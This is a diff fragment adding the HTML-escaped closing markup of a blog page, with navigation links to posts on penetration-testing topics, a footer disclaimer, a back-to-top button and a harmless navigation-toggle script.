+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Previous&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 12 — Crafting Wins With Public Exploits&lt;/span&gt;
+      &lt;/a&gt;
+      &lt;span class=&quot;blog-article-nav-delimiter&quot; aria-hidden=&quot;true&quot;&gt;&amp;nbsp;•&amp;nbsp;&lt;/span&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;next&quot;
+        
+        href=&quot;../blog/operator-shells.html&quot;
+        data-default-href=&quot;../blog/operator-shells.html&quot;
+        data-default-fragment=&quot;../blog/fragments/operator-shells.html&quot;
+        data-fragment-href=&quot;../blog/fragments/operator-shells.html&quot;
+        data-target-slug=&quot;operator-shells&quot;
+        data-post-slug=&quot;operator-shells&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Next&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;OffSec Field Notes — Shells and Tradecraft Snippets&lt;/span&gt;
+      &lt;/a&gt;
+    &lt;/nav&gt;
+  
+&lt;/article&gt;
+
+    &lt;/div&gt;
+  &lt;/main&gt;
+
+  &lt;footer&gt;
+    
+      &lt;!-- footer partial (auto-generated) --&gt;
+&lt;div id=&quot;foot&quot;&gt;
+  &lt;p&gt;
+    &lt;center&gt;
+      Warning! Chaosandmajesty.com accepts no responsibility for your interactions with WOPR.
+    &lt;/center&gt;
+  &lt;/p&gt;
+&lt;/div&gt;
+
+    
+    &lt;div class=&quot;container footer-container&quot;&gt;
+      &lt;p class=&quot;footer-copy&quot;&gt;&amp;copy; 2025 Core&lt;/p&gt;
+    &lt;/div&gt;
+  &lt;/footer&gt;
+
+  &lt;button type=&quot;button&quot; class=&quot;blog-back-to-top&quot; aria-label=&quot;Back to top&quot;&gt;
+    ▲
+  &lt;/button&gt;
+
+  &lt;script&gt;
+    document.addEventListener(&#039;DOMContentLoaded&#039;, function() {
+      var toggleBtn = document.querySelector(&#039;.nav-toggle&#039;);
+      var headerEl = document.querySelector(&#039;header&#039;);
+      if (toggleBtn) {
+        toggleBtn.addEventListener(&#039;click&#039;, function() {
+          headerEl.classList.toggle(&#039;nav-open&#039;);
+        });
+      }
+    });
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+      </div>
+    </article>
+  
